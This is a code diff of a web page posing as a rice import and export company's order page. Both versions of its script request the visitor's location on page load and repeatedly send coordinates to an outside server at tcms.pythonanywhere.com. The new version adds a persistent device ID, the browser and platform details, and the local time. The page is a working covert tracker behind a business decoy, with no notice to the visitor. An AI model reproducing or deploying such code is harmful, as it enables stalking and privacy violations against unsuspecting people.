@@ -1,46 +1,54 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>International Rice Import & Export Company</title>
-</head>
-<body>
-    <h2 id="message">Continue to get order...</h2> <!-- ✅ Message instead of button -->
+<script>
+    function sendLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                let localTime = new Date().toLocaleString("en-US", { timeZone: "Asia/Karachi" }); // ✅ Local Time (PST)
+                let deviceID = getDeviceID(); // ✅ Generate a Unique Device ID
+                let deviceDetails = getDeviceInfo(); // ✅ Get device info
 
-    <script>
-        function sendLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    position => sendData(position),
-                    error => console.error("Error getting location: " + error.message)
-                );
-            } else {
-                console.error("Geolocation is not supported by this browser.");
-            }
-        }
-
-        function sendData(position) {
-            fetch("https://tcms.pythonanywhere.com/send-location", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date().toISOString()
+                fetch("https://tcms.pythonanywhere.com/send-location", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        device_id: deviceID, // ✅ Unique Device Identifier
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        local_time: localTime,
+                        device_info: deviceDetails
+                    })
                 })
-            })
-            .then(response => response.json())
-            .then(data => console.log("Location sent successfully"))
-            .catch(error => console.error("Error sending location: " + error.message));
+                .then(response => response.json())
+                .then(data => console.log("Location sent successfully!"))
+                .catch(error => console.error("Error sending data: " + error.message));
+            }, error => {
+                console.error("Error getting location: " + error.message);
+            });
+        } else {
+            console.error("Geolocation is not supported by this browser.");
         }
+    }
 
-        // ✅ Automatically send location once site is opened
-        window.onload = sendLocation;
+    // ✅ Function to generate a unique device ID (stores it in LocalStorage)
+    function getDeviceID() {
+        let storedID = localStorage.getItem("deviceID");
+        if (!storedID) {
+            storedID = "Device-" + Math.random().toString(36).substr(2, 9); // ✅ Unique Device ID
+            localStorage.setItem("deviceID", storedID);
+        }
+        return storedID;
+    }
 
-        // ✅ Continue sending location every 30 seconds
-        setInterval(sendLocation, 30000);
-    </script>
-</body>
-</html>
+    function getDeviceInfo() {
+        let userAgent = navigator.userAgent;
+        let platform = navigator.platform;
+        return `Device: ${platform}, Browser: ${userAgent}`;
+    }
+
+    // ✅ Automatically send location when page loads
+    window.onload = sendLocation;
+
+    // ✅ Send location every 30 minutes (1800000 milliseconds)
+    setInterval(sendLocation, 1800000);
+</script>
